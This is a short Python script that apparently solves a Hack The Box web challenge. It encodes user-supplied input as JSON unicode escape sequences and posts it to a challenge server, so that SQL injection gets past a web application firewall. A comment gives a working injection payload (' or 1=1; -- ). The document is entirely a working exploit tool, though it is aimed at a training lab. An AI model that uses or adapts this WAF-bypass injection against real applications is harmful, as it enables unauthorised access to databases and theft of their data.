import requests
import codecs

# Useful link for this challenge
# https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/

# Get target URL for ease the work
url = "http://docker.hackthebox.eu:32520/"
#url = "http://localhost/wafwaf/wafwaf.php"

runAgain = True
while runAgain:
	# Get data from input
	print("The Target Query is: SELECT note FROM notes WHERE assignee = '...' \n\n")
	data = input("Data for payload: ")
	unicodedData = ""

	for char in data:
		char = codecs.encode(bytes(char, 'utf-8'), "hex")	# convert char to hexadecimal value
		unicodedData += "\\u00" + char.decode('utf-8')

	# Build the payload		( good one: {' or 1=1; -- \} )
	payload = "{\"user\":\"%s\"}" % unicodedData

	# Make a POST request
	response = requests.post(url, data=payload, headers={'Content-type': 'application/x-www-form-urlencoded'})

	# Show body data and textual response
	print("Request Body: " + response.request.body + "\n\n")
	print("Response: " + response.text + "\n")

	runAgain = False if input("Run again? (Y / n):  ") == "n" else True
